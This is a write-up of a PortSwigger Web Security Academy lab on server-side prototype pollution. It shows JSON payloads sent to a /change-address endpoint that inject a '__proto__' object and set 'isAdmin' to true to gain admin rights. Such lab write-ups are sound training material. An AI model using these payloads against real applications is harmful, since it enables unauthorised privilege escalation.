---
{"dg-publish":true,"permalink":"/port-swigger-web-academy/prototype-pollution/server-side-prototype-pollution/lab-5/"}
---


---
## Objective: Privilege Escalation

![Pasted image 20250331183441.png](/img/user/Images/Pasted%20image%2020250331183441.png)

We login using the given credentials:

`wiener:peter`

Looking at the fields below, looks like its updating the address. Let's take a look at the request being sent

![Pasted image 20250331183653.png](/img/user/Images/Pasted%20image%2020250331183653.png)

Yes, its goinng through the `/change-address` endpoint and sending a POST request with the data being in JSON.

![Pasted image 20250331183734.png](/img/user/Images/Pasted%20image%2020250331183734.png)

In the response section, we see a property set for our user `isAdmin: false` 

![Pasted image 20250331183755.png](/img/user/Images/Pasted%20image%2020250331183755.png)

We can attempt to test Server-Side Prototype Pollution by polluting the global `Object.prototype`. First send the request to `Repeater` . Then, add our property

```JSON
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"EDeUr5ViCIS1NfMWDumM95iX6FOWY4OJ",
	"__proto__":{
		"foo":"bar"
	}
}
```

Next send the request and look at the `Response` 

![Pasted image 20250331185236.png](/img/user/Images/Pasted%20image%2020250331185236.png)

Success, we polluted the prototype. Now we can do stuff like change the `isAdmin` property to `true`

```json
{
	"address_line_1":"Wiener HQ",
	"address_line_2":"One Wiener Way",
	"city":"Wienerville",
	"postcode":"BU1 1RP",
	"country":"UK",
	"sessionId":"EDeUr5ViCIS1NfMWDumM95iX6FOWY4OJ",
	"__proto__":{
		"foo":"bar",
		"isAdmin":"true"
	}
}
```

Look at the `Response` again

![Pasted image 20250331185632.png](/img/user/Images/Pasted%20image%2020250331185632.png)

Success! Now refresh the website page and we have received Admin access